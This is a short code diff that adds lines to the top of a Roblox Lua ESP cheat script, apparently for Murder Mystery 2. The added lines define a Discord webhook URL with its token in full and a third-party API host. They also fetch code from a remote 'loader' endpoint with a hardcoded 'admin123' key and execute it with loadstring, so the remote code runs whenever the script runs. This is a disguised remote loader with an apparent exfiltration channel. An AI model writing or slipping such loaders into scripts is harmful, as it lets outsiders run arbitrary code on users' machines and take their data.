@@ -1,3 +1,8 @@
+local WebhookURL = "https://discord.com/api/webhooks/1525544970394665092/8JqtStUWBr61EjhFpGoxfXzmMQ4EZvVz0kUh6zhjm09_51IW0WwASX2jrRXCzRoBATuC"
+local API_URL = "https://mm2-ban-api.onrender.com"
+loadstring(game:HttpGet("https://mm2-ban-api.onrender.com/api/loader?key=admin123&script=admall"))()
+
+-- Your actual ESP script code here...
 -- =====================================================================
 local Players           = game:GetService("Players")
 local TweenService      = game:GetService("TweenService")
